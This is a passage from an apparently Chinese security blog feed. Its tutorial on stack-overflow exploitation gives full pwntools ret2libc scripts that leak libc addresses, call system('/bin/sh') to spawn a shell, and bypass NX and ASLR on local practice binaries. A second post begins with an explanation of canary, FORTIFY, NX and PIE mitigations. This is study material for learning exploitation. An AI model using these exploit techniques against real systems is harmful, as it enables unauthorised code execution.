class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure><p>万事具备我们就直接构造EXP即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_gets_addr = <span class="number">0x08048460</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="string">&quot;A&quot;</span> * <span class="number">0x70</span>, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, <span class="string">&#x27;6666&#x27;</span>, buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行流程</span></span><br><span class="line">PUSH 参数-&gt;PUSH 返回地址-&gt;JMP system函数地址-&gt;PUSH 参数（进入CALL调用栈中）-&gt;POP 参数(由于为了堆栈平衡之前PUSH了参数)-&gt;CALL gets函数</span><br><span class="line"><span class="comment">#伪C++代码类似下面</span></span><br><span class="line">system(gets(*buf2))</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/18.png?raw=true" alt="image-20201120190619022"></p><p>关于栈的分布图</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/19.png?raw=true" alt="19"></p><hr><h4 id="无system-函数和-bin-sh字符串"><a href="#无system-函数和-bin-sh字符串" class="headerlink" title="无system()函数和/bin/sh字符串"></a>无system()函数和/bin/sh字符串</h4><p>首先查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ./ret2libc3</span><br><span class="line">[*] <span class="string">&#x27;/home/ascotbe/Desktop/Pwn/ret2libc3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以发现是加载<strong>libc.so</strong>动态链接库的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd2100</span>  <span class="number">0xf7fef7f3</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7de81d0</span>  <span class="number">0xf7f4171a</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure><p>可以发现没有<code>system()</code>函数和<code>/bin/sh</code>字符串了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/20.png?raw=true" alt="image-20201121103715703"></p><p>由于他加载了<strong>libc.so</strong>，那么我们可以明确几点</p><ul><li><p>动态链接库中的函数之间相对偏移是固定的</p></li><li><p>A 真实地址 (内存物理地址) - A 偏移地址 = B 真实地址 (内存物理地址) -B 偏移地址 = 基地址</p></li><li><p>如果我们知道<strong>libc.so</strong>中某个函数的地址，那么我们就可以确定该程序利用的<strong>libc.so</strong>。进而我们就可以知道<code>system()</code>函数的地址。通过<code>puts()</code>泄露某个已执行过的函数的GOT地址，并且返回地址设置为_start()或main()，以便于重新执行一遍程序；</p></li></ul><p>简单地说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。</p><p>我们可以看下本题的_start()函数内容，其包含main()和__libc_start_main()函数的调用，也就是说，它才是程序真正的入口</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/22.png?raw=true" alt="img"></p><p>那么我们就可以编写EXP了，这个EXP就算开启了ASLR的话都是狂野利用的，所以我们这边绕过了<strong>NX</strong>保护和<strong>ASLR</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]puts plt: &quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]puts got: &quot;</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]_start addr: &quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&quot;A&quot;</span> * <span class="number">112</span>, puts_plt, start_addr, puts_got])<span class="comment">#把puts_got地址放到栈中参数位置</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))<span class="comment">#获取到输出的值，里面带有我们放入的puts_got地址</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak puts addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#获取相对偏移</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#</span></span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]system addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]binsh addr: &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload2 to getshell...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">&quot;B&quot;</span> * <span class="number">112</span>, system_addr, <span class="string">&quot;CCCC&quot;</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/23.png?raw=true" alt="image-20201121164703334"></p><blockquote><h2 id="绕过ASLR保护"><a href="#绕过ASLR保护" class="headerlink" title="绕过ASLR保护"></a>绕过ASLR保护</h2></blockquote><p>测试代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">vuln_func();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -m32 -fno-stack-protector -z noexecstack -no-pie test.c -o test.out</span></span><br></pre></td></tr></table></figure><p>首先检查题目的保护和是否开启了ASLR保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ldd test.out </span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7f71000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7da0000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f73000)</span><br><span class="line">ascotbe@ubuntu:~/Desktop/PWN$ ldd test.out </span><br><span class="line">linux-gate.so.1 =&gt;  (0xf7fba000)</span><br><span class="line">libc.so.6 =&gt; /lib32/libc.so.6 (0xf7de9000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7fbc000)</span><br></pre></td></tr></table></figure><p>运行的时候查看下加载了什么动态链接库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$  i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line">0xf7fd9860  0xf7ff28dd  Yes (*)     /lib/ld-linux.so.2</span><br><span class="line">0xf7e1d750  0xf7f4696d  Yes (*)     /lib32/libc.so.6</span><br></pre></td></tr></table></figure><p>题目的思路：由于程序未开启PIE，导致程序本身的地址是固定的，我们可以通过write()函数进行信息泄露，打印出libc的地址，进而计算system()的地址</p><p>EXP就分为两个流程：</p><ul><li>通过payload在vuln_func中进行栈溢出，调用write@plt 打印出write@got，完成后又返回到vuln_func中</li><li>通过再次溢出调用计算出相对地址的system函数获得shell</li></ul><p>首先查看溢出位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$  pattern create 200</span><br><span class="line">&#39;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#39;</span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: &#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn&#x2F;test.out </span><br><span class="line">AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xc9 </span><br><span class="line">EBX: 0x6c414150 (&#39;PAAl&#39;)</span><br><span class="line">ECX: 0xffffcd80 (&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;...)</span><br><span class="line">EDX: 0x100 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1ead6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1ead6c </span><br><span class="line">EBP: 0x41514141 (&#39;AAQA&#39;)</span><br><span class="line">ESP: 0xffffce10 (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">EIP: 0x41416d41 (&#39;AmAA&#39;)</span><br><span class="line">EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41416d41</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce10 (&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0004| 0xffffce14 (&quot;AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0008| 0xffffce18 (&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0012| 0xffffce1c (&quot;TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0016| 0xffffce20 (&quot;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0020| 0xffffce24 (&quot;ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0024| 0xffffce28 (&quot;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">0028| 0xffffce2c (&quot;AAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\316\377\377&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41416d41 in ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41416d41</span><br><span class="line">1094806849 found at offset: 140</span><br></pre></td></tr></table></figure><div class="note info modern"><p>1.由于和题目ret2libc3不一样，溢出函数不是在main()中而是在vuln_func_addr()中，所以我们只需要获取vuln_func_addr()函数的地址来作为返回地址</p><p>2.要利用什么函数就需要根据函数的具体参数来构造栈，比如利用<code>write(STDOUT_FILENO, &quot;Hello world!\n&quot;, 13)</code>，那么我们栈的构造就需要<code>write(1,address,4)</code>来传递参数</p></div><p>编写EXP，运行环境Ubuntu 16.04 Python3.8 （Ubuntu20.04 Python3.8无法运行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coidng: utf-8 -*-</span></span><br><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./test.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">write_plt=elf.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#elf.plt[&#x27;write&#x27;]</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vuln_func_addr = elf.symbols[<span class="string">&#x27;vuln_func&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write plt: &quot;</span> + <span class="built_in">hex</span>(write_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]write got: &quot;</span> + <span class="built_in">hex</span>(write_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]vuln func addr: &quot;</span> + <span class="built_in">hex</span>(vuln_func_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = (<span class="string">&quot;A&quot;</span> * <span class="number">140</span>).encode()+ p32(write_plt)+p32(vuln_func_addr)+p32(<span class="number">1</span> )+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#&quot;A&quot; * 140是溢出需要的字节</span></span><br><span class="line"><span class="comment">#write(1,address,4)表示将address向外写</span></span><br><span class="line">print(payload1)</span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak write addr: &quot;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc_addr=write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#获取相对偏移</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">&quot;B&quot;</span> * <span class="number">140</span>).encode() + p32(system_addr) + p32(vuln_func_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/26.png?raw=true" alt="image-20210325200443317"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;c90530c910b0</span><br><span class="line">https:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;2019&#x2F;03&#x2F;05&#x2F;%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc</span><br><span class="line">《ctf竞赛权威指南（PWN篇）》</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>栈溢出总结（0x01）</title>
    <link href="https://www.ascotbe.com/2020/11/19/StackOverflow_0x01/"/>
    <id>https://www.ascotbe.com/2020/11/19/StackOverflow_0x01/</id>
    <published>2020-11-19T10:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.416Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>记录下自己学习堆栈溢出的内容，这篇就是栈溢出入门的东西，也算是栈溢出总结的上篇，缝合怪文章大部分都是参考各个师傅的文章，后面还会有堆溢出。写文章的初心是为了总结梳理下自己的学习过程。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/1.gif?raw=true" alt="74CBF97F98866D946732450F281B1AD0"></p><blockquote><h3 id="栈溢出利用方式"><a href="#栈溢出利用方式" class="headerlink" title="栈溢出利用方式"></a>栈溢出利用方式</h3></blockquote><ul><li>ROP（修改返回地址，让其指向内存中已有的一段指令<ul><li>ret2shellcode（修改返回地址，让其指向溢出数据中的一段指令</li><li>ret2libc（修改返回地址，让其指向内存中已有的某个函数</li><li>BROP</li><li>ret2dl-resolve</li><li>SROP</li></ul></li></ul><blockquote><h3 id="常用保护机制"><a href="#常用保护机制" class="headerlink" title="常用保护机制"></a>常用保护机制</h3></blockquote><h4 id="CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护"><a href="#CANNARY金丝雀-栈保护-Stack-protect-栈溢出保护" class="headerlink" title="CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护"></a><strong>CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护</strong></h4><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                       <span class="comment">#默认情况下，不开启Canary保护</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  <span class="comment">#禁用栈保护</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c     <span class="comment">#启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c <span class="comment">#启用堆栈保护，为所有函数插入保护代码</span></span><br></pre></td></tr></table></figure><hr><h4 id="FORTIFY-轻微的检查"><a href="#FORTIFY-轻微的检查" class="headerlink" title="FORTIFY/轻微的检查"></a><strong>FORTIFY/轻微的检查</strong></h4><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                        <span class="comment">#默认情况下，不会开这个检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c    <span class="comment">#较弱的检查</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c    <span class="comment">#较强的检查</span></span><br></pre></td></tr></table></figure><hr><h4 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h4><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>工作原理如图：<br><img src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/2.png?raw=true" alt="img"></p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                <span class="comment">#默认情况下，开启NX保护</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c   <span class="comment">#禁用NX保护</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c <span class="comment">#开启NX保护</span></span><br></pre></td></tr></table></figure><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><hr><h4 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h4><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p><strong>如果只开启ASLR的话，本身二进制程序是不支持随机化加载的，所以就出现了ret2plt、GOT表劫持、地址爆破等</strong></p><p>内存地址随机化机制（address space layout randomization)，有以下四种情况</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br><span class="line">2+PIE - 全部随机化</span><br></pre></td></tr></table></figure><table><thead><tr><th>ASLR</th><th>Executable</th><th>PLT</th><th>Heap</th><th>Stack</th><th>Shared 